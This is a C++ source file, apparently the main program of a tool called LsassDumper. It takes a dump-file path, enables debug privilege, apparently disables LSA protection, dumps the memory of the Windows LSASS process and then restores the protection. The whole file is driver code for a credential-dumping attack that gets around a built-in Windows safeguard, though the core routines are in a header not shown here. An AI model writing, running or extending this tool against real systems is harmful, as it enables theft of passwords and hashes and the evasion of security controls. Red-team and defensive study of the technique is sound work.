#include "../include/LsassDumper.h"
#include <iostream>
#include <string>

void printUsage()
{
    std::wcout << L"Usage: LsassDumper.exe -p <dump file path>" << std::endl;
    std::wcout << L"Example: LsassDumper.exe -p C:\\lsass.dmp" << std::endl;
}

int wmain(int argc, wchar_t* argv[])
{
    std::wstring dumpPath = L"lsass.dmp";
    LsassDumper dumper;

    if (!dumper.EnableDebugPrivilege())
    {
        dumper.PrintError(L"Unable to enable SE_DEBUG_NAME privilege. Exiting.");
        return 1;
    }

    for (int i = 1; i < argc; ++i)
    {
        if (std::wcscmp(argv[i], L"-p") == 0 && i + 1 < argc)
        {
            dumpPath = argv[i + 1];
            i++;
        }
        else
        {
            printUsage();
            return 1;
        }
    }

    if (!dumper.ModifyLsaProtection(true))
    {
        dumper.PrintError(L"[-] Failed to modify LSA protection.");
        return 1;
    }

    if (!dumper.IsRunningAsAdmin())
    {
        dumper.PrintError(L"[-] This program must be run as administrator.");
        return 1;
    }

    if (!dumper.Dump(dumpPath))
    {
        dumper.PrintError(L"[-] Dumping failed.");
        return 1;
    }

    if (!dumper.ModifyLsaProtection(false))
    {
        dumper.PrintError(L"[-] Failed to re-enable LSA protection.");
        return 1;
    }

    return 0;
}
